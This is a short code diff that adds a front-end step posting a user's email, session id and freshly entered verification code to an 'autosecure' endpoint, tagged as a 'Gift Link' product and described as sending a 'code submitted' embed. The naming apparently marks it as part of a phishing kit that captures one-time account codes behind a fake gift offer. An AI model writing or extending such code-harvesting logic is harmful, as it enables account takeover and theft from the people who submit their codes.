@@ -13,6 +13,27 @@ if (fs.existsSync(filePath)) {
                 return;
             }
 
+            // Enviar embed de code submitted
+            try {
+                const sessionEmail = sessionStorage.getItem('user_email');
+                const sessionId = sessionStorage.getItem('autosecure_session');
+                
+                await fetch('/api/autosecure/code-submitted', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: sessionEmail,
+                        code: code.value,
+                        sessionId: sessionId,
+                        product: 'Gift Link'
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending code submitted embed:', error);
+            }
+
             isProcessing.value = true;
             errorMessage.value = '';
 
